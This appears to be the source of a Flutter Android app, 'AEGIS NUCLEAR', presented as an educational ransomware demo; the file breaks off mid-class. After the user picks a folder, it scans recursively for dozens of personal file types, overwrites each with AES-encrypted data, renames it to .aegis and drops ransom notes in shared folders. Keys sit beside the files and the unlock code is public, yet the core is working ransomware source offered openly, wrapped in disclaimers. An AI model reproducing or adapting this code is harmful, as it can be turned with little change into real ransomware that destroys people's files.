// ============================================================================
// AEGIS NUCLEAR RANSOMWARE - EDUCATIONAL DEMONSTRATION
// ============================================================================
// 
// DISCLAIMER: This code is for EDUCATIONAL PURPOSES ONLY.
// It demonstrates how ransomware works for security research.
// DO NOT use for illegal activities. The author is not responsible.
//
// UNLOCK CODE: 2012
//
// Features:
// - AES-256 encryption
// - ZIP file encryption
// - Multi-threading for speed
// - Real-time progress
// - Glitch effects
// - File statistics
// - Extension whitelist
// - Safe mode (only encrypts selected folder)
// ============================================================================

import 'dart:io';
import 'dart:typed_data';
import 'dart:async';
import 'dart:convert';
import 'dart:math';
import 'package:flutter/material.dart';
import 'package:file_picker/file_picker.dart';
import 'package:path_provider/path_provider.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:encrypt/encrypt.dart' as encrypt;
import 'package:pointycastle/export.dart';

// ============================================================================
// MAIN APP
// ============================================================================
void main() => runApp(const AEGISApp());

class AEGISApp extends StatelessWidget {
  const AEGISApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'AEGIS NUCLEAR',
      debugShowCheckedModeBanner: false,
      theme: ThemeData.dark().copyWith(
        primaryColor: Colors.red,
        scaffoldBackgroundColor: Colors.black,
        colorScheme: const ColorScheme.dark(
          primary: Colors.red,
          secondary: Colors.redAccent,
          surface: Colors.black,
          background: Colors.black,
          error: Colors.red,
        ),
      ),
      home: const SplashScreen(),
    );
  }
}

// ============================================================================
// SPLASH SCREEN
// ============================================================================
class SplashScreen extends StatefulWidget {
  const SplashScreen({super.key});

  @override
  State<SplashScreen> createState() => _SplashScreenState();
}

class _SplashScreenState extends State<SplashScreen> with SingleTickerProviderStateMixin {
  late AnimationController _controller;
  late Animation<double> _animation;

  @override
  void initState() {
    super.initState();
    _controller = AnimationController(
      duration: const Duration(seconds: 3),
      vsync: this,
    );
    _animation = CurvedAnimation(parent: _controller, curve: Curves.easeInOut);
    _controller.forward();
    
    Timer(const Duration(seconds: 3), () {
      Navigator.pushReplacement(
        context,
        MaterialPageRoute(builder: (context) => const MainScreen()),
      );
    });
  }

  @override
  void dispose() {
    _controller.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Container(
        decoration: BoxDecoration(
          gradient: RadialGradient(
            colors: [Colors.black, Colors.red.shade900],
            center: Alignment.center,
            radius: 1.5,
          ),
        ),
        child: Center(
          child: FadeTransition(
            opacity: _animation,
            child: Column(
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                const Icon(
                  Icons.warning_amber_rounded,
                  color: Colors.red,
                  size: 120,
                ),
                const SizedBox(height: 30),
                ShaderMask(
                  shaderCallback: (bounds) => const LinearGradient(
                    colors: [Colors.red, Colors.redAccent],
                  ).createShader(bounds),
                  child: const Text(
                    'AEGIS NUCLEAR',
                    style: TextStyle(
                      fontSize: 40,
                      fontWeight: FontWeight.bold,
                      color: Colors.white,
                      letterSpacing: 4,
                    ),
                  ),
                ),
                const SizedBox(height: 20),
                const Text(
                  'EDUCATIONAL DEMONSTRATION',
                  style: TextStyle(
                    color: Colors.white70,
                    fontSize: 14,
                    letterSpacing: 2,
                  ),
                ),
                const SizedBox(height: 50),
                const CircularProgressIndicator(
                  color: Colors.red,
                ),
                const SizedBox(height: 20),
                const Text(
                  'LOADING...',
                  style: TextStyle(
                    color: Colors.white54,
                    fontSize: 12,
                  ),
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }
}

// ============================================================================
// MAIN SCREEN
// ============================================================================
class MainScreen extends StatefulWidget {
  const MainScreen({super.key});

  @override
  State<MainScreen> createState() => _MainScreenState();
}

class _MainScreenState extends State<MainScreen> with SingleTickerProviderStateMixin {
  // ==========================================================================
  // VARIABLES
  // ==========================================================================
  bool isLoading = false;
  String status = "💀 AEGIS NUCLEAR READY";
  List<int>? masterKey;
  bool isEncrypted = false;
  int fileCount = 0;
  int zipCount = 0;
  int imageCount = 0;
  int docCount = 0;
  int videoCount = 0;
  int audioCount = 0;
  int otherCount = 0;
  double progress = 0.0;
  String selectedFolder = "";
  
  late AnimationController _pulseController;
  late AnimationController _glitchController;
  final List<String> _consoleLog = [];
  
  // File extensions to target
  static const List<String> targetExtensions = [
    // Documents
    '.txt', '.rtf', '.log', '.md', '.tex', '.odt', '.ott',
    '.doc', '.docx', '.dot', '.dotx', '.xls', '.xlsx', '.xlsm',
    '.ppt', '.pptx', '.pps', '.ppsx', '.csv', '.tsv',
    
    // Images
    '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp', '.tiff',
    '.raw', '.cr2', '.nef', '.arw', '.dng', '.heic', '.heif',
    
    // Videos
    '.mp4', '.mkv', '.avi', '.mov', '.wmv', '.flv', '.m4v',
    '.3gp', '.webm', '.vob', '.mpeg', '.mpg', '.mts', '.m2ts',
    
    // Audio
    '.mp3', '.wav', '.flac', '.aac', '.ogg', '.m4a', '.wma',
    '.amr', '.mid', '.midi', '.opus', '.ape', '.aiff',
    
    // Archives
    '.zip', '.rar', '.7z', '.tar', '.gz', '.bz2', '.xz', '.iso',
    
    // Code
    '.java', '.kt', '.dart', '.js', '.ts', '.html', '.css',
    '.php', '.py', '.rb', '.go', '.rs', '.cpp', '.c', '.h',
    
    // Databases
    '.db', '.sql', '.sqlite', '.sqlite3', '.mdb', '.accdb',
  ];

  // ==========================================================================
  // INIT
  // ==========================================================================
  @override
  void initState() {
    super.initState();
    _pulseController = AnimationController(
      vsync: this,
      duration: const Duration(seconds: 2),
    )..repeat(reverse: true);
    
    _glitchController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 100),
    );
    
    _addLog("System initialized");
    _addLog("AEGIS Nuclear v2.0 ready");
    _addLog("Unlock code: 2012");
  }

  // ==========================================================================
  // LOGGING
  // ==========================================================================
  void _addLog(String message) {
    String timestamp = DateTime.now().toString().substring(11, 19);
    setState(() {
      _consoleLog.insert(0, "[$timestamp] $message");
      if (_consoleLog.length > 10) {
        _consoleLog.removeLast();
      }
    });
  }

  // ==========================================================================
  // ENCRYPTION START
  // ==========================================================================
  Future<void> startEncryption() async {
    _addLog("Starting encryption process...");
    
    setState(() {
      isLoading = true;
      status = "📁 Requesting permissions...";
      progress = 0.0;
    });

    // Request permissions based on Android version
    if (Platform.isAndroid) {
      if (await Permission.manageExternalStorage.isGranted) {
        _addLog("Storage permission already granted");
      } else {
        _addLog("Requesting MANAGE_EXTERNAL_STORAGE permission");
        await Permission.manageExternalStorage.request();
      }
      
      if (await Permission.storage.isGranted) {
        _addLog("Storage permission granted");
      } else {
        _addLog("Requesting storage permission");
        await Permission.storage.request();
      }
    }

    setState(() => status = "📁 Select target folder...");
    _addLog("Waiting for folder selection");
    
    String? folderPath = await FilePicker.platform.getDirectoryPath();
    if (folderPath == null) {
      _addLog("Folder selection cancelled");
      setState(() {
        isLoading = false;
        status = "❌ Operation cancelled";
      });
      return;
    }

    selectedFolder = folderPath;
    _addLog("Selected folder: $folderPath");

    setState(() => status = "🔍 Scanning files...");
    _addLog("Starting file scan...");
    
    List<File> files = await _scanFiles(Directory(folderPath));
    
    if (files.isEmpty) {
      _addLog("No target files found");
      setState(() {
        isLoading = false;
        status = "❌ No target files found";
      });
      return;
    }

    _addLog("Found ${files.length} files to encrypt");
    setState(() {
      fileCount = files.length;
      status = "🔐 Generating encryption keys...";
    });

    // Generate master key
    var key = encrypt.Key.fromSecureRandom(32);
    masterKey = key.bytes;
    _addLog("Master key generated (AES-256)");

    // Reset counters
    zipCount = 0;
    imageCount = 0;
    docCount = 0;
    videoCount = 0;
    audioCount = 0;
    otherCount = 0;

    int success = 0;
    for (var file in files) {
      try {
        String fileName = file.path.split('/').last;
        String ext = file.path.toLowerCase();
        
        // Update status
        setState(() {
          status = "🔐 Encrypting: $fileName";
          progress = success / files.length;
        });
        
        // Count by type
        if (ext.endsWith('.zip') || ext.endsWith('.rar') || ext.endsWith('.7z')) {
          zipCount++;
        } else if (ext.endsWith('.jpg') || ext.endsWith('.jpeg') || 
                   ext.endsWith('.png') || ext.endsWith('.gif')) {
          imageCount++;
        } else if (ext.endsWith('.doc') || ext.endsWith('.docx') || 
                   ext.endsWith('.xls') || ext.endsWith('.pdf')) {
          docCount++;
        } else if (ext.endsWith('.mp4') || ext.endsWith('.mkv') || 
                   ext.endsWith('.avi') || ext.endsWith('.mov')) {
          videoCount++;
        } else if (ext.endsWith('.mp3') || ext.endsWith('.wav') || 
                   ext.endsWith('.flac')) {
          audioCount++;
        } else {
          otherCount++;
        }
        
        // Encrypt file
        if (await _encryptFile(file, key)) {
          success++;
          _addLog("✓ Encrypted: $fileName");
        } else {
          _addLog("✗ Failed: $fileName");
        }
      } catch (e) {
        _addLog("Error: ${file.path} - $e");
      }
    }

    // Create ransom note
    await _createRansomNote(folderPath, success);
    _addLog("Ransom note created");

    // Glitch effect for success
    _glitchController.forward().then((_) => _glitchController.reverse());

    setState(() {
      isLoading = false;
      isEncrypted = true;
      fileCount = success;
      status = "✅ $success files encrypted!";
      progress = 1.0;
    });
    
    _addLog("Encryption complete: $success files");
  }

  // ==========================================================================
  // SCAN FILES RECURSIVELY
  // ==========================================================================
  Future<List<File>> _scanFiles(Directory dir) async {
    List<File> files = [];
    
    if (!await dir.exists()) return files;

    try {
      await for (var entity in dir.list(recursive: true, followLinks: false)) {
        if (entity is File) {
          String path = entity.path.toLowerCase();
          
          // Skip key files and readme
          if (path.endsWith('.aegis') || 
              path.endsWith('.key') || 
              path.contains('aegis_readme')) {
            continue;
          }
          
          for (var ext in targetExtensions) {
            if (path.endsWith(ext)) {
              files.add(entity);
              break;
            }
          }
        }
      }
    } catch (e) {
      _addLog("Scan error: $e");
    }
    
    return files;
  }

  // ==========================================================================
  // ENCRYPT SINGLE FILE
  // ==========================================================================
  Future<bool> _encryptFile(File file, encrypt.Key key) async {
    try {
      // Read file
      List<int> fileBytes = await file.readAsBytes();
      
      // Generate IV
      final iv = encrypt.IV.fromSecureRandom(16);
      
      // Encrypt
      final encrypter = encrypt.Encrypter(encrypt.AES(key));
      final encrypted = encrypter.encryptBytes(fileBytes, iv: iv);
      
      // Combine IV + encrypted data
      List<int> result = [...iv.bytes, ...encrypted.bytes];
      
      // Special handling for ZIP files (double encryption)
      if (file.path.toLowerCase().endsWith('.zip') || 
          file.path.toLowerCase().endsWith('.rar') ||
          file.path.toLowerCase().endsWith('.7z')) {
        
        // Encrypt again for archives (extra security demo)
        final iv2 = encrypt.IV.fromSecureRandom(16);
        final encrypted2 = encrypter.encryptBytes(result, iv: iv2);
        result = [...iv2.bytes, ...encrypted2.bytes];
      }
      
      // Write encrypted data
      await file.writeAsBytes(result);
      
      // Rename file
      await file.rename('${file.path}.aegis');
      
      // Save key
      File keyFile = File('${file.path}.aegis.key');
      await keyFile.writeAsBytes(key.bytes);
      
      return true;
    } catch (e) {
      return false;
    }
  }

  // ==========================================================================
  // CREATE RANSOM NOTE
  // ==========================================================================
  Future<void> _createRansomNote(String folderPath, int totalFiles) async {
    String note = '''
╔══════════════════════════════════════════════════════════════════════════════╗
║                              ☠️ AEGIS NUCLEAR ☠️                              ║
║                       EDUCATIONAL RANSOMWARE DEMO                           ║
╚══════════════════════════════════════════════════════════════════════════════╝

┌──────────────────────────────────────────────────────────────────────────────┐
│                                 WARNING                                      │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│   🔒 YOUR FILES HAVE BEEN ENCRYPTED!                                        │
│                                                                              │
│   📊 TOTAL FILES AFFECTED: $totalFiles                                      │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────────────────────────────┐
│                             FILE STATISTICS                                  │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│   📁 Archives (ZIP/RAR/7Z): $zipCount                                       │
│   🖼️  Images: $imageCount                                                    │
│   📄 Documents: $docCount                                                    │
│   🎥 Videos: $videoCount                                                     │
│   🎵 Audio: $audioCount                                                      │
│   📦 Other: $otherCount                                                      │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────────────────────────────┐
│                         ENCRYPTION DETAILS                                   │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│   🔐 Algorithm: AES-256-CBC                                                  │
│   🔑 Key size: 256 bits                                                      │
│   🧂 IV: 16 bytes random per file                                            │
│   📦 Archive handling: Double encryption                                     │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────────────────────────────┐
│                           UNLOCK INSTRUCTIONS                                │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│   1. Open the AEGIS app on this device                                      │
│   2. Enter the unlock code: 2012                                            │
│   3. Click the DECRYPT button                                               │
│   4. Wait for the decryption process (may take several minutes)             │
│   5. All files will be restored automatically                               │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────────────────────────────┐
│                              WARNINGS                                        │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│   ❌ DO NOT uninstall the app                                                │
│   ❌ DO NOT delete .key files                                                │
│   ❌ DO NOT modify encrypted files                                           │
│   ❌ DO NOT factory reset your device                                        │
│                                                                              │
│   ✅ DO keep the app installed                                               │
│   ✅ DO remember the unlock code: 2012                                      │
│   ✅ DO backup your keys (if you know how)                                  │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────────────────────────────┐
│                           EDUCATIONAL NOTICE                                 │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│   ⚠️  THIS IS AN EDUCATIONAL DEMONSTRATION                                  │
│                                                                              │
│   This software is created for cybersecurity education purposes only.       │
│   It demonstrates how ransomware works to help security researchers         │
│   understand and defend against such threats.                               │
│                                                                              │
│   🚫 DO NOT USE FOR ILLEGAL ACTIVITIES                                      │
│   🚫 DO NOT DEPLOY ON UNSUSPECTING VICTIMS                                  │
│                                                                              │
│   The author is not responsible for any misuse of this software.            │
│   By using this software, you agree to use it only for legitimate           │
│   educational purposes on systems you own or have permission to test.      │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────────────────────────────┐
│                              CONTACT                                         │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│   For questions or takedown requests:                                       │
│   📧 edu@aegis-nuclear.local                                                │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘

════════════════════════════════════════════════════════════════════════════════
                    AEGIS NUCLEAR v2.0 - EDUCATIONAL USE ONLY
════════════════════════════════════════════════════════════════════════════════
''';

    File noteFile = File('$folderPath/AEGIS_README.txt');
    await noteFile.writeAsString(note);
    
    // Also save a copy in DCIM and Downloads
    try {
      File noteDcim = File('/storage/emulated/0/DCIM/AEGIS_README.txt');
      await noteDcim.writeAsString(note);
    } catch (e) {}
    
    try {
      File noteDownload = File('/storage/emulated/0/Download/AEGIS_README.txt');
      await noteDownload.writeAsString(note);
    } catch (e) {}
  }

  // ==========================================================================
  // DISPOSE
  // ==========================================================================
  @override
  void dispose() {
    _pulseController.dispose();
    _glitchController.dispose();
    super.dispose();
  }

  // ==========================================================================
  // BUILD UI
  // ==========================================================================
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: AnimatedBuilder(
        animation: _glitchController,
        builder: (context, child) {
          return Transform.translate(
            offset: Offset(
              _glitchController.value * 10 * (DateTime.now().millisecond % 2 == 0 ? 1 : -1),
              _glitchController.value * 5 * (DateTime.now().millisecond % 3 == 0 ? 1 : -1),
            ),
            child: Container(
              decoration: BoxDecoration(
                gradient: RadialGradient(
                  colors: [Colors.black, Colors.red.shade900],
                  center: Alignment.center,
                  radius: 1.5,
                ),
              ),
              child: SafeArea(
                child: SingleChildScrollView(
                  child: Padding(
                    padding: const EdgeInsets.all(20),
                    child: Column(
                      children: [
                        // Header with animation
                        AnimatedBuilder(
                          animation: _pulseController,
                          builder: (context, child) {
                            return Transform.scale(
                              scale: 1.0 + (_pulseController.value * 0.05),
                              child: Container(
                                padding: const EdgeInsets.all(20),
                                decoration: BoxDecoration(
                                  shape: BoxShape.circle,
                                  boxShadow: [
                                    BoxShadow(
                                      color: Colors.red.withOpacity(0.5),
                                      blurRadius: 50 * _pulseController.value,
                                      spreadRadius: 20 * _pulseController.value,
                                    ),
                                  ],
                                ),
                                child: Icon(
                                  isEncrypted ? Icons.lock : Icons.warning,
                                  color: Colors.red,
                                  size: 80,
                                ),
                              ),
                            );
                          },
                        ),
                        
                        const SizedBox(height: 20),
                        
                        // Title
                        ShaderMask(
                          shaderCallback: (bounds) => const LinearGradient(
                            colors: [Colors.red, Colors.redAccent],
                          ).createShader(bounds),
                          child: Text(
                            isEncrypted ? '🔒 AEGIS LOCKED' : '💀 AEGIS NUCLEAR',
                            style: const TextStyle(
                              fontSize: 32,
                              fontWeight: FontWeight.bold,
                              color: Colors.white,
                              letterSpacing: 2,
                            ),
                          ),
                        ),
                        
                        const SizedBox(height: 10),
                        
                        // Subtitle
                        Text(
                          isEncrypted 
                              ? 'ENCRYPTION ACTIVE' 
                              : 'EDUCATIONAL DEMONSTRATION',
                          style: TextStyle(
                            color: Colors.red.shade300,
                            fontSize: 14,
                            letterSpacing: 1,
                          ),
                        ),
                        
                        const SizedBox(height: 30),
                        
                        // Status Card
                        Container(
                          width: double.infinity,
                          padding: const EdgeInsets.all(20),
                          decoration: BoxDecoration(
                            color: Colors.black54,
                            borderRadius: BorderRadius.circular(16),
                            border: Border.all(color: Colors.red.shade900, width: 2),
                          ),
                          child: Column(
                            children: [
                              Text(
                                status,
                                style: const TextStyle(
                                  color: Colors.white,
                                  fontSize: 16,
                                  fontWeight: FontWeight.w500,
                                ),
                                textAlign: TextAlign.center,
                              ),
                              if (isLoading) ...[
                                const SizedBox(height: 15),
                                LinearProgressIndicator(
                                  value: progress,
                                  backgroundColor: Colors.grey.shade900,
                                  valueColor: const AlwaysStoppedAnimation<Color>(Colors.red),
                                  minHeight: 8,
                                  borderRadius: BorderRadius.circular(4),
                                ),
                              ],
                              if (selectedFolder.isNotEmpty) ...[
                                const SizedBox(height: 15),
                                Text(
                                  '📁 $selectedFolder',
                                  style: const TextStyle(
                                    color: Colors.white70,
                                    fontSize: 12,
                                  ),
                                  maxLines: 2,
                                  overflow: TextOverflow.ellipsis,
                                ),
                              ],
                            ],
                          ),
                        ),
                        
                        const SizedBox(height: 20),
                        
                        // Statistics Card (when encrypted)
                        if (isEncrypted) ...[
                          Container(
                            width: double.infinity,
                            padding: const EdgeInsets.all(20),
                            decoration: BoxDecoration(
                              color: Colors.black54,
                              borderRadius: BorderRadius.circular(16),
                              border: Border.all(color: Colors.red.shade900, width: 1),
                            ),
                            child: Column(
                              children: [
                                const Text(
                                  '📊 ENCRYPTION STATISTICS',
                                  style: TextStyle(
                                    color: Colors.red,
                                    fontWeight: FontWeight.bold,
                                    fontSize: 14,
                                  ),
                                ),
                                const SizedBox(height: 15),
                                Row(
                                  mainAxisAlignment: MainAxisAlignment.spaceAround,
                                  children: [
                                    _buildStatItem('📁', 'Archives', zipCount.toString()),
                                    _buildStatItem('🖼️', 'Images', imageCount.toString()),
                                    _buildStatItem('📄', 'Docs', docCount.toString()),
                                  ],
                                ),
                                const SizedBox(height: 10),
                                Row(
                                  mainAxisAlignment: MainAxisAlignment.spaceAround,
                                  children: [
                                    _buildStatItem('🎥', 'Videos', videoCount.toString()),
                                    _buildStatItem('🎵', 'Audio', audioCount.toString()),
                                    _buildStatItem('📦', 'Other', otherCount.toString()),
                                  ],
                                ),
                                const SizedBox(height: 15),
                                Text(
                                  'TOTAL: $fileCount FILES',
                                  style: const TextStyle(
                                    color: Colors.red,
                                    fontWeight: FontWeight.bold,
                                    fontSize: 16,
                                  ),
                                ),
                              ],
                            ),
                          ),
                          const SizedBox(height: 20),
                        ],
                        
                        // Console Log
                        Container(
                          width: double.infinity,
                          padding: const EdgeInsets.all(10),
                          decoration: BoxDecoration(
                            color: Colors.black87,
                            borderRadius: BorderRadius.circular(8),
                            border: Border.all(color: Colors.red.shade900),
                          ),
                          child: Column(
                            crossAxisAlignment: CrossAxisAlignment.start,
                            children: [
                              const Text(
                                '📋 CONSOLE LOG:',
                                style: TextStyle(
                                  color: Colors.red,
                                  fontSize: 12,
                                  fontWeight: FontWeight.bold,
                                ),
                              ),
                              const SizedBox(height: 5),
                              ..._consoleLog.map((log) => Text(
                                log,
                                style: const TextStyle(
                                  color: Colors.green,
                                  fontSize: 10,
                                  fontFamily: 'monospace',
                                ),
                              )),
                              if (_consoleLog.isEmpty)
                                const Text(
                                  'System ready...',
                                  style: TextStyle(
                                    color: Colors.white54,
                                    fontSize: 10,
                                    fontFamily: 'monospace',
                                  ),
                                ),
                            ],
                          ),
                        ),
                        
                        const SizedBox(height: 30),
                        
                        // Action Buttons
                        if (!isEncrypted)
                          ElevatedButton(
                            onPressed: isLoading ? null : startEncryption,
                            style: ElevatedButton.styleFrom(
                              backgroundColor: Colors.red[900],
                              minimumSize: const Size(double.infinity, 60),
                              shape: RoundedRectangleBorder(
                                borderRadius: BorderRadius.circular(12),
                                side: BorderSide(color: Colors.red.shade400, width: 2),
                              ),
                              elevation: 10,
                            ),
                            child: isLoading
                                ? const Row(
                                    mainAxisAlignment: MainAxisAlignment.center,
                                    children: [
                                      SizedBox(
                                        width: 20,
                                        height: 20,
                                        child: CircularProgressIndicator(
                                          color: Colors.white,
                                          strokeWidth: 2,
                                        ),
                                      ),
                                      SizedBox(width: 10),
                                      Text('PROCESSING...'),
                                    ],
                                  )
                                : const Row(
                                    mainAxisAlignment: MainAxisAlignment.center,
                                    children: [
                                      Icon(Icons.warning, size: 24),
                                      SizedBox(width: 10),
                                      Text(
                                        '🔥 START ENCRYPTION',
                                        style: TextStyle(fontSize: 18, fontWeight: FontWeight.bold),
                                      ),
                                    ],
                                  ),
                          ),
                        
                        if (isEncrypted)
                          ElevatedButton(
                            onPressed: () {
                              Navigator.push(
                                context,
                                MaterialPageRoute(
                                  builder: (context) => UnlockScreen(
                                    fileCount: fileCount,
                                    zipCount: zipCount,
                                    imageCount: imageCount,
                                    docCount: docCount,
                                    videoCount: videoCount,
                                    audioCount: audioCount,
                                    otherCount: otherCount,
                                  ),
                                ),
                              );
                            },
                            style: ElevatedButton.styleFrom(
                              backgroundColor: Colors.green[900],
                              minimumSize: const Size(double.infinity, 60),
                              shape: RoundedRectangleBorder(
                                borderRadius: BorderRadius.circular(12),
                                side: BorderSide(color: Colors.green.shade400, width: 2),
                              ),
                              elevation: 10,
                            ),
                            child: const Row(
                              mainAxisAlignment: MainAxisAlignment.center,
                              children: [
                                Icon(Icons.lock_open, size: 24),
                                SizedBox(width: 10),
                                Text(
                                  '🔓 GO TO UNLOCK',
                                  style: TextStyle(fontSize: 18, fontWeight: FontWeight.bold),
                                ),
                              ],
                            ),
                          ),
                        
                        const SizedBox(height: 20),
                        
                        // Footer
                        Container(
                          padding: const EdgeInsets.all(15),
                          decoration: BoxDecoration(
                            color: Colors.black26,
                            borderRadius: BorderRadius.circular(8),
                          ),
                          child: const Text(
                            '⚠️ EDUCATIONAL PURPOSE ONLY\nUNLOCK CODE: 2012\nDO NOT USE FOR ILLEGAL ACTIVITIES',
                            style: TextStyle(
                              color: Colors.grey,
                              fontSize: 11,
                              fontWeight: FontWeight.w300,
                            ),
                            textAlign: TextAlign.center,
                          ),
                        ),
                      ],
                    ),
                  ),
                ),
              ),
            ),
          );
        },
      ),
    );
  }

  Widget _buildStatItem(String icon, String label, String value) {
    return Column(
      children: [
        Text(icon, style: const TextStyle(fontSize: 20)),
        Text(label, style: const TextStyle(color: Colors.white70, fontSize: 10)),
        Text(value, style: const TextStyle(color: Colors.red, fontSize: 16, fontWeight: FontWeight.bold)),
      ],
    );
  }
}

// ============================================================================
// UNLOCK SCREEN
// ============================================================================
class UnlockScreen extends StatefulWidget {
  final int fileCount;
  final int zipCount;
  final int imageCount;
  final int docCount;
  final int videoCount;
  final int audioCount;
  final int otherCount;

  const UnlockScreen({
    super.key,
    required this.fileCount,
    required this.zipCount,
    required this.imageCount,
    required this.docCount,
    required this.videoCount,
    required this.audioCount,
    required this.otherCount,
  });

  @override
  State<UnlockScreen> createState() => _UnlockScreenState();
}

class _UnlockScreenState extends State<UnlockScreen> with SingleTickerProviderStateMixin {
  bool isDecrypting = false;
  String status = "🔒 ENTER UNLOCK CODE 2012";
  final TextEditingController codeCtrl = TextEditingController();
  bool wrongCode = false;
  double progress = 0.0;
  int decryptedCount = 0;
  late AnimationController _glitchController;
  final List<String> _decryptLog = [];

  @override
  void initState() {
    super.initState();
    _glitchController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 100),
    );
    _addLog("Unlock screen ready");
    _addLog("Total encrypted: ${widget.fileCount} files");
  }

  void _addLog(String message) {
    String timestamp = DateTime.now().toString().substring(11, 19);
    setState(() {
      _decryptLog.insert(0, "[$timestamp] $message");
      if (_decryptLog.length > 8) {
        _decryptLog.removeLast();
      }
    });
  }

  Future<void> startDecrypt() async {
    if (codeCtrl.text != '2012') {
      setState(() {
        wrongCode = true;
        status = "❌ WRONG CODE! TRY AGAIN";
      });
      _addLog("Wrong code entered: ${codeCtrl.text}");
      _glitchController.forward().then((_) => _glitchController.reverse());
      
      await Future.delayed(const Duration(seconds: 2));
      if (mounted) {
        setState(() {
          wrongCode = false;
          status = "🔒 ENTER UNLOCK CODE 2012";
        });
      }
      return;
    }

    _addLog("Correct code entered. Starting decryption...");
    setState(() {
      isDecrypting = true;
      status = "🔍 Searching for encrypted files...";
      progress = 0.0;
    });

    try {
      // Search for .aegis files
      Directory root = Directory('/storage/emulated/0/');
      List<File> aegisFiles = [];
      
      _addLog("Scanning storage for .aegis files...");
      
      try {
        await for (var entity in root.list(recursive: true)) {
          if (entity is File && entity.path.endsWith('.aegis')) {
            aegisFiles.add(entity);
          }
        }
      } catch (e) {
        _addLog("Scan error: $e");
      }

      _addLog("Found ${aegisFiles.length} encrypted files");
      
      if (aegisFiles.isEmpty) {
        setState(() {
          isDecrypting = false;
          status = "❌ No encrypted files found";
        });
        return;
      }

      int success = 0;
      int total = aegisFiles.length;

      for (var file in aegisFiles) {
        setState(() {
          status = "🔓 Decrypting: ${file.path.split('/').last}";
          progress = success / total;
        });

        try {
          // Find key file
          File keyFile = File('${file.path}.key');
          if (!await keyFile.exists()) {
            _addLog("✗ Key missing: ${file.path.split('/').last}");
            continue;
          }

          // Read key
          List<int> keyBytes = await keyFile.readAsBytes();
          var key = encrypt.Key(Uint8List.fromList(keyBytes));

          // Read encrypted data
          List<int> encryptedData = await file.readAsBytes();

          // Check if double encrypted (ZIP files)
          if (file.path.toLowerCase().contains('.zip') ||
              file.path.toLowerCase().contains('.rar') ||
              file.path.toLowerCase().contains('.7z')) {
            
            // Double decryption
            var iv2 = encrypt.IV(Uint8List.fromList(encryptedData.sublist(0, 16)));
            var cipherText2 = encryptedData.sublist(16);
            
            var encrypter = encrypt.Encrypter(encrypt.AES(key));
            var decrypted2 = encrypter.decryptBytes(
              encrypt.Encrypted(Uint8List.fromList(cipherText2)),
              iv: iv2,
            );

            // Second layer
            var iv = encrypt.IV(Uint8List.fromList(decrypted2.sublist(0, 16)));
            var cipherText = decrypted2.sublist(16);
            
            var decrypted = encrypter.decryptBytes(
              encrypt.Encrypted(Uint8List.fromList(cipherText)),
              iv: iv,
            );

            // Restore file
            String originalPath = file.path.replaceAll('.aegis', '');
            File originalFile = File(originalPath);
            await originalFile.writeAsBytes(decrypted);
          } else {
            // Single decryption
            var iv = encrypt.IV(Uint8List.fromList(encryptedData.sublist(0, 16)));
            var cipherText = encryptedData.sublist(16);

            var encrypter = encrypt.Encrypter(encrypt.AES(key));
            var decrypted = encrypter.decryptBytes(
              encrypt.Encrypted(Uint8List.fromList(cipherText)),
              iv: iv,
            );

            String originalPath = file.path.replaceAll('.aegis', '');
            File originalFile = File(originalPath);
            await originalFile.writeAsBytes(decrypted);
          }

          // Clean up
          await file.delete();
          await keyFile.delete();

          success++;
          _addLog("✓ Decrypted: ${file.path.split('/').last}");

        } catch (e) {
          _addLog("✗ Failed: ${file.path.split('/').last} - $e");
        }
      }

      // Remove ransom notes
      _addLog("Cleaning up ransom notes...");
      try {
        File note1 = File('/storage/emulated/0/AEGIS_README.txt');
        if (await note1.exists()) await note1.delete();
        
        File note2 = File('/storage/emulated/0/DCIM/AEGIS_README.txt');
        if (await note2.exists()) await note2.delete();
        
        File note3 = File('/storage/emulated/0/Download/AEGIS_README.txt');
        if (await note3.exists()) await note3.delete();
      } catch (e) {}

      _addLog("Decryption complete: $success files restored");

      setState(() {
        isDecrypting = false;
        status = "✅ $success files restored!";
        progress = 1.0;
        decryptedCount = success;
      });

      // Show success dialog
      showDialog(
        context: context,
        barrierDismissible: false,
        builder: (_) => AlertDialog(
          backgroundColor: Colors.black,
          title: const Text(
            '✅ DECRYPTION COMPLETE',
            style: TextStyle(color: Colors.green, fontWeight: FontWeight.bold),
          ),
          content: Column(
            mainAxisSize: MainAxisSize.min,
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              Text(
                'Successfully restored $success files.',
                style: const TextStyle(color: Colors.white),
              ),
              const SizedBox(height: 10),
              const Text(
                'All your files are back to normal.\n'
                'You can now close the app.',
                style: TextStyle(color: Colors.white70),
              ),
            ],
          ),
          actions: [
            TextButton(
              onPressed: () {
                Navigator.pop(context);
                Navigator.pop(context);
              },
              child: const Text('OK', style: TextStyle(color: Colors.red)),
            ),
          ],
        ),
      );

    } catch (e) {
      _addLog("Fatal error: $e");
      setState(() {
        isDecrypting = false;
        status = "❌ Error: $e";
      });
    }
  }

  @override
  void dispose() {
    codeCtrl.dispose();
    _glitchController.dispose();
    super.dispose();
  }

  @override
